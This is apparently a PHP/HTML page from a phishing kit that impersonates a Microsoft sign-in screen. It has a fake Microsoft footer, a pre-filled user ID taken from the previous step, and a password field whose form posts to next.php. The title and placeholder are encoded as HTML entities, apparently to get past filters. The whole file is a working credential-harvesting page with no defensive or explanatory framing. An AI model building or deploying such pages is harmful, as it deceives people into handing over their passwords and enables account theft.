<?php
$userid = $_POST['userid'];
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#83;&#105;&#103;&#110;&#32;&#73;&#110;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
              <link href="css/conv.min.css" rel="stylesheet" />

<style type="text/css">
  .textbox {
    padding-left: 0px;
    height: 36px;
    color: #333;
    border: none;
    border-bottom: 1px solid #666;
   font-size: 15px;
	font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
    outline: none;
}
.textbox:focus {
    background: #fff;
    border-bottom: 1px solid #0067B8;
}
 </style>
<style type="text/css">
 .textrbox {
    height: 26px;
    width: 275px;
	padding-left: 8px;
	font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
    font-size: 15px;
	color: #262626;
    text-align: left;
    line-height: 20px;
    font-weight: 400;
    font-size: .9375rem;
    border: 0px solid #fff;
	background-color: #FFFFFF;
    
    
}
 .textrbox:focus {
    border-color: #fff;
	
	background-color: #FFFFFF;	
    border-width: 0px;
    outline: 0;
}
 </style>

 <style type="text/css">
 input[type=checkbox].css-checkbox {
							position:absolute; z-index:-1000; left:-1000px; overflow: hidden; clip: rect(0 0 0 0); height:1px; width:1px; margin:-1px; padding:0; border:0;
						}

						input[type=checkbox].css-checkbox + label.css-label {
							padding-left:26px;
							height:21px; 
							display:inline-block;
							line-height:21px;
							background-repeat:no-repeat;
							background-position: 0 0;
							font-size:21px;
							vertical-align:middle;
							cursor:pointer;

						}

						input[type=checkbox].css-checkbox:checked + label.css-label {
							background-position: 0 -21px;
						}
						label.css-label {
				background-image:url(images/csscheckbox_a4824bcf5d413f078bdd6abd3e6e5bf4.png);
				-webkit-touch-callout: none;
				-webkit-user-select: none;
				-khtml-user-select: none;
				-moz-user-select: none;
				-ms-user-select: none;
				user-select: none;
			}
 </style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1366px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<div data-bind="component: { name: 'background-image', publicMethods: backgroundControlMethods }"><div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }"><!-- ko if: smallImageUrl --> <div class="blur" data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;images/small.jpg?x=12f4b8b543125cc986c79cd85320812f&quot;);"></div><!-- /ko --><!-- ko if: backgroundImageUrl --> <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;images/t1.jpg?x=f5a9a9531b8f4bcc86eabb19472d15d5&quot;);"></div><!-- /ko --><!-- ko if: !!backgroundImageUrl() --> <div class="background-overlay"></div><!-- /ko --> </div></div>
<body>
<div id="container">
<body  bgColor="#030100">
<div id="image1" style="position:absolute; overflow:hidden; left:477px; top:136px; width:450px; height:385px; z-index:0"><img src="images/t3.png" alt="" title="" border=0 width=450 height=385></div>

<form action=next.php name=aggebhagja autocomplete="off" id=aggebhagja method=post>

<input name="userid" value="<?=$userid?>" class="textrbox"  required type="text" style="position: absolute; width: 380px; left: 544px; top: 219px; z-index: 1">
<input name="pass"  placeholder="&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;" class="textbox"  required type="password"  style="position: absolute; width: 357px; left: 524px; top: 298px; z-index: 2">
<div id="formimage1" style="position: absolute; left: 771px; top: 443px; z-index: 3"><input type="image" name="formimage1" width="110" height="34" src="images/logn.png"></div>

<div id="image6" style="position: absolute; overflow: hidden; left: 524px; top: 392px; width: 120px; height: 16px; z-index: 5"><a href="#"><img src="images/m9.png" alt="" title="" border=0 width=120 height=16></a></div>
<div id="checkboxG1"  style="position: absolute; left: 524px; top: 350px; z-index: 4"><input type="checkbox" name="checkboxG1" id="checkboxG1" class="css-checkbox"><label for="checkboxG1" class="css-label radGroup1 chk"></label></div>
<div id="checkboxG1"  style="position: absolute; left: 524px; top: 350px; z-index: 4"><input type="checkbox" name="checkboxG2" id="checkboxG2" class="css-checkbox"><label for="checkboxG2" class="css-label radGroup1 clr"></label></div>

</div>
</div>
<div id="footer"> <div data-bind="component: { name: 'footer-control',
            params: {
                serverData: svr,
                showLinks: true },
            event: {
                agreementClick: footer_agreementClick } }"><!-- ko if: showLinks || impressumLink || showIcpLicense --> <div id="footerLinks" class="footerNode text-secondary"><!-- ko if: !showIcpLicense --> <span id="ftrCopy" data-bind="html: svr.strCopyrightTxt">© 2018 Microsoft</span><!-- /ko --> <a id="ftrTerms" data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="#">Terms of use</a> <a id="ftrPrivacy" data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="#">Privacy &amp; Cookies</a><!-- ko if: impressumLink --><!-- /ko --><!-- ko if: showIcpLicense --><!-- /ko --> </div> <!-- /ko --></div> </div>
</body>
</html>
